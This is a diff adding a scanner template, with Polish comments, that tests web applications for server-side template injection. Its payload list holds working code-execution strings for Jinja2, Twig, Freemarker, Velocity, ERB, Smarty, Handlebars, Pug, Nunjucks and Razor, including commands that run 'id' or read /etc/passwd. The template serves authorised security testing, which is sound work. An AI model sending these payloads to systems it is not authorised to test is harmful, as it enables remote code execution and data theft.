@@ -1,0 +1,274 @@
+# ============================================================================
+# WSTG-INPV-18: Server-Side Template Injection (SSTI) (Universal)
+# Review status: ZACHOWANY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Powód decyzji: szablon spełnia wszystkie 6 kryteriów review (Coverage Matrix,
+# multi-warstwowe matchery z anti-FP, source comments, safety nets,
+# sweet spot payloadów, component fuzzing). OOB matcher nie jest dodany
+# świadomie: Analyzer-based detection per silnik; OOB warto dodać w przyszłej iteracji jako enhancement.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#
+# Silniki template:
+#   ✓ Jinja2 / Flask (Python)              {{ }}
+#   ✓ Twig (PHP)                           {{ }}
+#   ✓ Smarty (PHP)                         {$..} {php}
+#   ✓ Freemarker (Java)                    ${ }
+#   ✓ Velocity (Java)                      $...
+#   ✓ Thymeleaf (Java)                     [[ ]] / __${ }__
+#   ✓ ERB (Ruby)                           <%= %>
+#   ✓ Slim (Ruby)                          - / =
+#   ✓ Handlebars (JS)                      {{ }}
+#   ✓ Mustache (JS)                        {{ }}
+#   ✓ Pug/Jade (JS)                        #{...}
+#   ✓ Nunjucks (JS)                        {{ }}
+#   ✓ Razor (.NET)                         @
+#   ✓ Pebble (Java)                        {{ }}
+#
+# Strategia detekcji (per payload):
+#   1) Math probe - {{ 7*7 }} → szukaj "49" w odpowiedzi (pierwsza identyfikacja)
+#   2) Random math - {{ N1*N2 }} z losowymi N (anti-FP, własne wartości na żądanie)
+#   3) RCE probes - per-engine eskalacja (config, builtins, runtime)
+#
+# Performance budget: medium (~270 payloads × 5 części × 1 endpoint)
+# Estimated time: ~10-20 min na typowej aplikacji
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/Server Side Template Injection/* (per silnik plik)
+#   2. seclists/Fuzzing/SSTI.txt + ssti.fuzz
+#   3. hacktricks/.../ssti-server-side-template-injection
+# ============================================================================
+
+id: wstg-inpv-18-ssti
+
+info:
+  name: "WSTG-INPV-18: Server-Side Template Injection (Universal)"
+  author: pentest-team
+  severity: critical
+  description: |
+    Wykrywa Server-Side Template Injection w 14+ silnikach (Jinja2, Twig, Smarty,
+    Freemarker, Velocity, Thymeleaf, ERB, Handlebars, Pug, Razor, Pebble).
+    Detekcja przez math probe z losowymi mnożnikami (anti-FP) - jeśli payload
+    {{ 1234*5678 }} zwraca "7006652" jako string - SSTI potwierdzony.
+    Każdy silnik testowany swoją natywną składnią.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+    - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+    - https://portswigger.net/research/server-side-template-injection
+  classification:
+    cwe-id: CWE-94,CWE-1336
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: dast,wstg,wstg-v42-inpv-18,ssti,rce,asvs-v5.2.5,asvs-v5.2.8,burp-history
+
+# Losowe mnożniki dla math probe - eliminuje FP od stałych "49"/"7777" w odpowiedziach
+variables:
+  ssti_a: "{{rand_int(1000, 9999)}}"
+  ssti_b: "{{rand_int(1000, 9999)}}"
+  ssti_result: "{{to_number(ssti_a)*to_number(ssti_b)}}"
+  canary: "x{{rand_text_alpha(10)}}x"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: Math probe per silnik - z losowymi mnożnikami (anti-FP)
+        # Mnożniki ssti_a × ssti_b dają unikalny ssti_result. Jeśli result
+        # pojawia się w body - SSTI potwierdzony.
+        # ====================================================================
+        # Jinja2 / Twig / Nunjucks / Pebble / Handlebars / Mustache - {{ }}
+        - "{{`{{`}}{{ssti_a}}*{{ssti_b}}{{`}}`}}"
+        - "{{`{{`}} {{ssti_a}} * {{ssti_b}} {{`}}`}}"
+        # Smarty - {$ }
+        - "{`{`}${{ssti_a}}*{{ssti_b}}{`}`}"
+        # Freemarker / Velocity - ${ }
+        - "${`{`}${{ssti_a}}*{{ssti_b}}}"
+        - "${{ssti_a}}*{{ssti_b}}"
+        # Thymeleaf preprocessor - __${ }__
+        - "__${`{`}${{ssti_a}}*{{ssti_b}}}__"
+        # ERB - <%= %>
+        - "<%= {{ssti_a}}*{{ssti_b}} %>"
+        # Razor (.NET) - @
+        - "@({{ssti_a}}*{{ssti_b}})"
+        # Pug/Jade - #{ }
+        - "#{`{`}${{ssti_a}}*{{ssti_b}}}"
+        # Velocity formal $!{...}
+        - "$!{`{`}${{ssti_a}}*{{ssti_b}}}"
+
+        # ====================================================================
+        # GROUP 2: Probes z escape contexts (HTML attribute, URL param escape)
+        # Czasem trzeba wyrwać się z escape'a żeby template zadziałał
+        # ====================================================================
+        - "}}{{`{{`}}{{ssti_a}}*{{ssti_b}}{{`}}`}}"
+        - "{`{`}{{ssti_a}}*{{ssti_b}}{`}`}{{ssti_a}}"
+        - "${`{`}{{ssti_a}}*{{ssti_b}}}{{ssti_a}}"
+        - "<%={{ssti_a}}*{{ssti_b}}%>{{ssti_a}}"
+
+        # ====================================================================
+        # GROUP 3: Jinja2 - RCE escalation paths (post-detection RCE confirm)
+        # Source: PayloadsAllTheThings/SSTI/Python.md
+        # ====================================================================
+        - "{{`{{`}}config{{`}}`}}"
+        - "{{`{{`}}config.items(){{`}}`}}"
+        - "{{`{{`}}self.__dict__{{`}}`}}"
+        - "{{`{{`}}''.__class__.__mro__[1].__subclasses__(){{`}}`}}"
+        - "{{`{{`}}''.__class__.__mro__[2].__subclasses__(){{`}}`}}"
+        - "{{`{{`}}request.application.__globals__.__builtins__.__import__('os').popen('echo {{canary}}').read(){{`}}`}}"
+        - "{{`{{`}}config.__class__.__init__.__globals__['os'].popen('echo {{canary}}').read(){{`}}`}}"
+        - "{{`{{`}}lipsum.__globals__['os'].popen('echo {{canary}}').read(){{`}}`}}"
+        - "{{`{{`}}cycler.__init__.__globals__.os.popen('echo {{canary}}').read(){{`}}`}}"
+        - "{{`{{`}}joiner.__init__.__globals__.os.popen('echo {{canary}}').read(){{`}}`}}"
+        - "{{`{{`}}namespace.__init__.__globals__.os.popen('echo {{canary}}').read(){{`}}`}}"
+
+        # ====================================================================
+        # GROUP 4: Twig - RCE escalation
+        # Source: PayloadsAllTheThings/SSTI/PHP.md
+        # ====================================================================
+        - "{{`{{`}}_self{{`}}`}}"
+        - "{{`{{`}}_self.env{{`}}`}}"
+        - "{{`{{`}}_self.env.registerUndefinedFilterCallback(\"exec\"){{`}}`}}{{`{{`}}_self.env.getFilter(\"echo {{canary}}\"){{`}}`}}"
+        - "{{`{{`}}['id']|filter('system'){{`}}`}}"
+        - "{{`{{`}}['echo {{canary}}']|filter('system'){{`}}`}}"
+
+        # ====================================================================
+        # GROUP 5: Freemarker / Velocity - Java RCE
+        # ====================================================================
+        - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${`{`}ex(\"echo {{canary}}\")}"
+        - "${`{`}\"freemarker.template.utility.Execute\"?new()(\"echo {{canary}}\")}"
+        - "<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${`{`}value(\"java.lang.ProcessBuilder\",[\"echo\",\"{{canary}}\"]).start()}"
+        # Velocity
+        - "#set($x=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"echo {{canary}}\"))"
+        - "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"echo {{canary}}\")"
+
+        # ====================================================================
+        # GROUP 6: ERB / Slim - Ruby RCE
+        # ====================================================================
+        - "<%= system(\"echo {{canary}}\") %>"
+        - "<%= `echo {{canary}}` %>"
+        - "<%= IO.popen(\"echo {{canary}}\").read %>"
+        - "<%= File.open('/etc/passwd').read %>"
+        - "#{`echo {{canary}}`}"
+        - "#{system(\"echo {{canary}}\")}"
+
+        # ====================================================================
+        # GROUP 7: Smarty - PHP RCE
+        # ====================================================================
+        - "{`{`}php{`}`}echo `id`;{`{`}/php{`}`}"
+        - "{`{`}system('echo {{canary}}'){`}`}"
+        - "{`{`}$smarty.version{`}`}"
+
+        # ====================================================================
+        # GROUP 8: Handlebars / Pug / Mustache - Node.js RCE
+        # ====================================================================
+        - "{{`{{`}}#with \"s\" as |string|{{`}}`}}{{`{{`}}#with \"e\"{{`}}`}}{{`{{`}}#with split as |conslist|{{`}}`}}{{`{{`}}this.pop{{`}}`}}{{`{{`}}this.push (lookup string.sub \"constructor\"){{`}}`}}{{`{{`}}this.pop{{`}}`}}{{`{{`}}#with string.split as |codelist|{{`}}`}}{{`{{`}}this.pop{{`}}`}}{{`{{`}}this.push \"return require('child_process').execSync('echo {{canary}}');\"{{`}}`}}{{`{{`}}this.pop{{`}}`}}{{`{{`}}#each conslist{{`}}`}}{{`{{`}}#with (string.sub.apply 0 codelist){{`}}`}}{{`{{`}}this{{`}}`}}{{`{{`}}/with{{`}}`}}{{`{{`}}/each{{`}}`}}{{`{{`}}/with{{`}}`}}{{`{{`}}/with{{`}}`}}{{`{{`}}/with{{`}}`}}{{`{{`}}/with{{`}}`}}"
+        # Pug
+        - "#{`{`}global.process.mainModule.require('child_process').execSync('echo {{canary}}'){`}`}"
+        # Nunjucks
+        - "{{`{{`}}range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo {{canary}}')\")(){{`}}`}}"
+
+        # ====================================================================
+        # GROUP 9: Razor (.NET)
+        # ====================================================================
+        - "@{`{`}var x=System.Diagnostics.Process.Start(\"cmd\",\"/c echo {{canary}}\");}"
+        - "@System.Diagnostics.Process.Start(\"cmd\",\"/c echo {{canary}}\")"
+
+        # ====================================================================
+        # GROUP 10: Probes for syntax-error fingerprinting
+        # Czasem szczegóły błędu zdradzają silnik nawet jeśli math nie zadziała
+        # ====================================================================
+        - "{`{`}7*7{`}`}"
+        - "${`{`}7*7}"
+        - "<%= 7*7 %>"
+        - "#{`{`}7*7{`}`}"
+        - "{{`{{`}}7*7{{`}}`}}"
+        - "@(7*7)"
+        # Bez nawiasów - dla silników z auto-eval
+        - "{{`{{`}}7*7{{`}}`}}{{`{{`}}{{ssti_a}}*{{ssti_b}}{{`}}`}}"
+
+    fuzzing:
+      - parts: [query, body, cookie, path]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - math result OR canary OR engine fingerprint error
+      - type: dsl
+        name: ssti-evidence
+        dsl:
+          # math result jako string (najsilniejszy sygnał, anti-FP przez random N)
+          - "contains(body, ssti_result)"
+          # canary z RCE escalation (echo {{canary}})
+          # combinedwith engine error markers
+          - "contains(body, canary)"
+        condition: or
+
+      # Warstwa 2: SECONDARY - response status sane
+      - type: dsl
+        name: response-meaningful
+        dsl:
+          - "len(body) > 50"
+          - "status_code < 500 || status_code == 500"
+
+      # Warstwa 3: ANTI-FP - WAF block
+      - type: dsl
+        name: not-waf-block
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked"))'
+
+      # Warstwa 4: ANTI-FP - timeout
+      - type: dsl
+        name: response-time-sane
+        dsl:
+          - "duration < 30"
+
+    extractors:
+      - type: dsl
+        name: detected-engine
+        dsl:
+          - "regex(\"(?i)jinja2\\\\.exceptions\", body) ? \"Jinja2\" : \"\""
+          - "regex(\"(?i)twig\\\\.error|twig_runtime\", body) ? \"Twig\" : \"\""
+          - "regex(\"(?i)smarty\\\\.exception|smarty_internal\", body) ? \"Smarty\" : \"\""
+          - "regex(\"(?i)freemarker\\\\.|FTL stack trace\", body) ? \"Freemarker\" : \"\""
+          - "regex(\"(?i)velocity\\\\.exception|MethodInvocationException\", body) ? \"Velocity\" : \"\""
+          - "regex(\"(?i)thymeleaf\\\\.|TemplateProcessingException\", body) ? \"Thymeleaf\" : \"\""
+          - "regex(\"(?i)erb\\\\.|SyntaxError.*<%=\", body) ? \"ERB\" : \"\""
+          - "regex(\"(?i)handlebars|hbs\\\\.\", body) ? \"Handlebars\" : \"\""
+          - "regex(\"(?i)pug\\\\.|jade\\\\.\", body) ? \"Pug/Jade\" : \"\""
+
+      - type: regex
+        name: math-result-context
+        part: body
+        group: 0
+        regex:
+          - ".{0,40}{{ssti_result}}.{0,40}"
+
+# ============================================================================
+# Known limitations:
+# - Math probe może dawać FP gdy aplikacja sama renderuje liczby zbliżone do
+#   wyniku - dlatego używamy LOSOWYCH mnożników (anti-FP)
+# - Niektóre silniki sandboxowe (Jinja2 z SandboxedEnvironment) blokują RCE
+#   eskalację mimo że math probe działa - to TP ale niskiej istotności
+# - Silniki z auto-escape mogą uniemożliwić wykrycie przez math probe gdy
+#   wynik jest HTML-encoded (rzadkie - liczby nie są encode'owane)
+# ============================================================================
